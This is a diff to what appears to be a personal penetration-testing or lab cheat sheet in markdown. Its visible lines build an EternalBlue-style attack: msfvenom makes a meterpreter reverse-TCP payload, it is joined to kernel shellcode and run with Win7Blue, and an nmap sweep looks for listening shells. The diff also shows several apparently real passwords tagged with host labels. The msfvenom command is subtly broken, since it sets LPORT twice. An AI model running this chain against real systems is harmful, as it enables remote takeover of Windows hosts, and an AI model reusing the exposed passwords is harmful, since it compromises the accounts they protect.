@@ -4,6 +4,7 @@ nmblookup -A <ip>
 msfvenom --payload windows/meterpreter/reverse_tcp LPORT=172.17.227.104 LPORT=4444 -o shellcode.bin
 cat sc_x86_kernel.bin shellcode.bin > sc_x86.bin
 ./Win7Blue
+nmap 172.17.226.0/24 -p 4444
 ```
 
 ```msfg
@@ -38,10 +39,11 @@ openssl rand -base64 20 | cut -c1-20
 x11vnc -viewonly -display :0 -rfbauth ~/.vnc/passwd &
 ```
 
-`Ew2IEOEcEkTD4aBYwukD`
-`1b2uns3wOz0OxNS2mODb`
-`KZb3MSs0tHcWnCIb12XZ`
-`DH6gxMPAvBq7BllvoyBY`
+`Ew2IEOEcEkTD4aBYwukD` (227 WTZ)
+`1b2uns3wOz0OxNS2mODb` (226 PXB)
+`KZb3MSs0tHcWnCIb12XZ` (226 WSY)
+`DH6gxMPAvBq7BllvoyBY` (226 WTZ)
+`JPtJjLGMXlt3GJ0QVETS` (226 SZS)
 
 |IP|Port|
 |:-:|:-:|
